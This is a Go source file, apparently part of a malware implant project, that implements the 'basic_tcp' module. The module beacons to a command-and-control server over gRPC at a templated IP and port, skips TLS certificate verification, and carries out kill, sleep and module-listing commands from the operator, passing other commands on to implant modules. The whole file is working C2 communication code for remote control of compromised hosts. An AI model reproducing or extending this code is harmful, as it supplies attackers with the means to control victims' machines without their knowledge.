package basic_tcp_network

import (
	"context"
	"crypto/tls"
	"fmt"
	"log"
	"malware/common/messages"
	"malware/common/types"
	"malware/implant/included_modules"
	"os"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/connectivity"
	"google.golang.org/grpc/credentials"
)

type state struct {
	running bool
	conn    *grpc.ClientConn
	grpc    *grpc.Server
}

type settings struct {
	state *state
	host  string
}

// Initialise connection
func (settings settings) doConnection() {
	client := messages.NewMalwareClient(settings.state.conn)
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Send a heartbeat message to ensure connection
	reply, err := client.CheckCommandQueue(ctx, messages.Implant_heartbeat(time.Now().Unix()))
	if err != nil {
		return
	}

	// If a message doesn't contain a heartbeat we need to decode it
	if reply.GetHeartbeat() != 0 {
		return
	}

	if reply.GetKill() {
		os.Exit(0)
	}

	if reply.GetSleep() != 0 {
		time.Sleep(time.Duration(reply.GetSleep()) * time.Second)
		return
	}

	// If message hasn't been handled yet, it is meant for one of the cores.
	// We provide a callback function to abstract away replying to the C2
	callback := func(msg *messages.CheckCmdRequest) {
		client := messages.NewMalwareClient(settings.state.conn)
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()

		client.CheckCommandQueue(ctx, msg)
	}

	if reply.GetListmodules() {
		modules := ""
		for _, module := range included_modules.Modules {
			modules += module.ID() + " "
		}
		callback(messages.Implant_data("list", []byte(modules)))
		return
	}

	for _, module := range included_modules.Modules {
		if module.HandleMessage(reply, callback) {
			return // This message has been handled, no need to do anything more
		}
	}

	// Message was not handled, send error message
	callback(messages.Implant_error(settings.ID(), types.ERR_MODULE_NOT_IMPL))
}

func (settings settings) fixConnection() {
	if settings.state.conn == nil || settings.state.conn.GetState() == connectivity.TransientFailure {
		if settings.state.conn != nil {
			settings.state.conn.Close()
		}

		var clientTLSConfig = &tls.Config{
			InsecureSkipVerify: true,
		}

		conn, err := grpc.Dial(settings.host, grpc.WithTransportCredentials(credentials.NewTLS(clientTLSConfig)))
		if err != nil {
			log.Fatalf("fail to dial: %v", err)
		}
		settings.state.conn = conn
	}
}

func (settings settings) listenServer() {
	for settings.state.running {
		settings.fixConnection()
		settings.doConnection()

		time.Sleep(1 * time.Second)
	}
	settings.state.conn.Close()
}

func (settings settings) HandleMessage(*messages.CheckCmdReply, func(*messages.CheckCmdRequest)) bool {
	return false
}

func Create() types.Module {
	port := int32(_C2_PORT_)
	ip := "_C2_IP_"
	state := state{}
	host := fmt.Sprintf("%s:%d", ip, port)

	return settings{&state, host}
}

func (settings settings) Init() {
	settings.state.running = true

	settings.listenServer()
}

func (settings settings) Shutdown() {
	settings.state.running = false
}

func (settings) ID() string { return "basic_tcp" }
